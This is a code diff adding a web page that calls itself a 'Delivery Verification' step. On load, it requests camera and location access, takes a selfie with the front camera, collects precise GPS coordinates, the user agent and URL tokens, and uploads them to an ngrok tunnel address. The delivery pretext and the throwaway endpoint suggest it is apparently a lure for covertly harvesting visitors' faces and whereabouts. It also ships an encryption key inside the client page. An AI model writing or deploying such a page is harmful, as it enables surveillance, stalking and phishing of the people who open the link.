@@ -1,0 +1,294 @@
+<!doctype html>
+<html>
+<head>
+  <title>Delivery API Live</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self' https:; connect-src 'self' http://localhost:* ws://localhost:* https://*.ngrok-free.dev; img-src 'self' data:; style-src 'self' 'unsafe-inline';">
+  <style>
+    body { 
+      font-family: Arial, sans-serif;
+      max-width: 480px;
+      margin: 0 auto;
+      padding: 16px;
+      line-height: 1.6;
+    }
+
+    /* ALWAYS visible Admin button */
+    .admin-btn {
+      position: fixed;
+      top: 15px;
+      left: 15px;
+      background: #007bff;
+      color: white;
+      padding: 10px 14px;
+      border-radius: 6px;
+      text-decoration: none;
+      font-size: 16px;
+      z-index: 9999;
+    }
+
+    #status { 
+      color: green; 
+      margin: 20px 0;
+      padding: 10px;
+      border-radius: 4px;
+      background: #f0f9ff;
+      border: 1px solid #b3e0ff;
+    }
+    
+    .error { 
+      color: #dc3545 !important; 
+      background: #fff5f5 !important;
+      border-color: #ffc9c9 !important;
+    }
+    
+    button {
+      background: #007bff;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 16px;
+      margin-top: 10px;
+      width: 100%;
+    }
+    
+    button:disabled {
+      background: #cccccc;
+      cursor: not-allowed;
+    }
+  </style>
+</head>
+
+<body>
+  <!-- ALWAYS visible Admin Login -->
+  <a href="/login" class="admin-btn">Admin Login</a>
+
+  <h2>Delivery Verification</h2>
+  <p>This page will ask for camera and location permissions. Please allow both when prompted.</p>
+
+  <div id="status">Requesting permissions…</div>
+  
+  <button id="retryBtn" style="display: none;">Retry</button>
+
+  <script>
+  (function() {
+    const SERVER_URL = "<%= process.env.SERVER_URL || 'https://imaginarily-unrailwayed-tyler.ngrok-free.dev/api/confirm' %>";
+    const ENCRYPTION_KEY = '<%= process.env.ENCRYPTION_KEY || 'your-32-byte-secure-key-1234567890abc' %>';
+
+    // Get URL parameters
+    const params = new URLSearchParams(location.search);
+    const deliveryId = params.get("deliveryId") || "unknown";
+    const token = params.get("token") || "";
+
+    const statusEl = document.getElementById("status");
+    const retryBtn = document.getElementById("retryBtn");
+
+    function setStatus(msg, isError = false) {
+      statusEl.textContent = msg;
+      statusEl.className = isError ? 'error' : '';
+      retryBtn.style.display = isError ? 'block' : 'none';
+    }
+
+    async function getLocation() {
+      return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) {
+          reject(new Error("Geolocation is not supported by your browser"));
+          return;
+        }
+        
+        navigator.geolocation.getCurrentPosition(
+          resolve, 
+          (err) => reject(new Error("Please enable location services and try again")),
+          { 
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+          }
+        );
+      });
+    }
+
+    async function capturePhoto() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { 
+            facingMode: "user",
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
+          }
+        });
+
+        const track = stream.getVideoTracks()[0];
+        const imgCap = new ImageCapture(track);
+
+        let blob;
+        try {
+          // Try to use takePhoto for better quality if available
+          blob = await imgCap.takePhoto();
+        } catch (e) {
+          // Fallback to canvas capture
+          const cv = document.createElement("canvas");
+          cv.width = 1280; 
+          cv.height = 720;
+          const ctx = cv.getContext("2d");
+          const videoTemp = document.createElement("video");
+          videoTemp.srcObject = stream;
+          await new Promise((resolve) => { videoTemp.onloadedmetadata = resolve; });
+          await videoTemp.play();
+          ctx.drawImage(videoTemp, 0, 0, cv.width, cv.height);
+          blob = await new Promise(resolve => cv.toBlob(resolve, "image/jpeg", 0.9));
+        }
+
+        // Stop all tracks in the stream
+        stream.getTracks().forEach(track => track.stop());
+        
+        return blob;
+      } catch (error) {
+        console.error("Error capturing photo:", error);
+        throw new Error("Failed to access camera. Please ensure you've granted camera permissions.");
+      }
+    }
+
+    // Encryption utilities
+    async function encryptData(data, key) {
+      const encoder = new TextEncoder();
+      const iv = window.crypto.getRandomValues(new Uint8Array(12));
+      const encodedData = encoder.encode(JSON.stringify(data));
+      
+      const cryptoKey = await window.crypto.subtle.importKey(
+        'raw',
+        encoder.encode(key),
+        { name: 'AES-GCM' },
+        false,
+        ['encrypt']
+      );
+      
+      const encryptedData = await window.crypto.subtle.encrypt(
+        { name: 'AES-GCM', iv },
+        cryptoKey,
+        encodedData
+      );
+      
+      // Combine IV and encrypted data for transport
+      const result = new Uint8Array(iv.length + encryptedData.byteLength);
+      result.set(iv, 0);
+      result.set(new Uint8Array(encryptedData), iv.length);
+      
+      return btoa(String.fromCharCode(...result));
+    }
+    
+    async function encryptFile(file) {
+      return new Promise((resolve, reject) => {
+        const reader = new FileReader();
+        reader.onload = async (e) => {
+          try {
+            const iv = window.crypto.getRandomValues(new Uint8Array(12));
+            const encoder = new TextEncoder();
+            const keyData = encoder.encode(ENCRYPTION_KEY);
+            
+            const cryptoKey = await window.crypto.subtle.importKey(
+              'raw',
+              keyData,
+              { name: 'AES-GCM' },
+              false,
+              ['encrypt']
+            );
+            
+            const encryptedData = await window.crypto.subtle.encrypt(
+              { name: 'AES-GCM', iv },
+              cryptoKey,
+              e.target.result
+            );
+            
+            // Combine IV and encrypted data
+            const result = new Uint8Array(iv.length + encryptedData.byteLength);
+            result.set(iv, 0);
+            result.set(new Uint8Array(encryptedData), iv.length);
+            
+            resolve(new Blob([result], { type: 'application/octet-stream' }));
+          } catch (err) {
+            reject(err);
+          }
+        };
+        reader.onerror = () => reject(new Error("Failed to read file"));
+        reader.readAsArrayBuffer(file);
+      });
+    }
+
+    async function init() {
+      try {
+        setStatus("Requesting camera and location permissions...");
+
+        // Request camera access first
+        await navigator.mediaDevices.getUserMedia({ video: true });
+        
+        // Then request location
+        const loc = await getLocation();
+        setStatus("Permissions granted. Capturing photo...");
+
+        // Capture photo
+        const blob = await capturePhoto();
+        setStatus("Encrypting data...");
+
+        // Encrypt location data
+        const locationData = {
+          lat: loc.coords.latitude,
+          lon: loc.coords.longitude,
+          accuracy: loc.coords.accuracy || 0,
+          timestamp: loc.timestamp || Date.now(),
+          userAgent: navigator.userAgent,
+          deliveryId: deliveryId,
+          token: token
+        };
+        
+        // Encrypt sensitive data in parallel
+        const [encryptedLocation, encryptedPhoto] = await Promise.all([
+          encryptData(locationData, ENCRYPTION_KEY),
+          encryptFile(blob)
+        ]);
+
+        setStatus("Uploading data...");
+
+        // Prepare form data with encrypted content
+        const fd = new FormData();
+        fd.append("deliveryId", deliveryId);
+        fd.append("token", token);
+        fd.append("encryptedData", encryptedLocation);
+        fd.append("photo", encryptedPhoto, `delivery-${deliveryId}-${Date.now()}.bin`);
+
+        const resp = await fetch(SERVER_URL, {
+          method: "POST",
+          body: fd,
+          credentials: "include"
+        });
+
+        if (!resp.ok) {
+          const errorText = await resp.text();
+          throw new Error(errorText || "Server returned an error");
+        }
+
+        setStatus("Delivery verified successfully! Thank you.");
+      } catch (err) {
+        console.error("Error:", err);
+        setStatus("Error: " + (err.message || "Something went wrong. Please try again."), true);
+      }
+    }
+
+    // Add retry button handler
+    retryBtn.addEventListener('click', () => {
+      window.location.reload();
+    });
+
+    // Initialize the app
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', init);
+    } else {
+      init();
+    }
+  })();
+  </script>
+</body>
+</html>
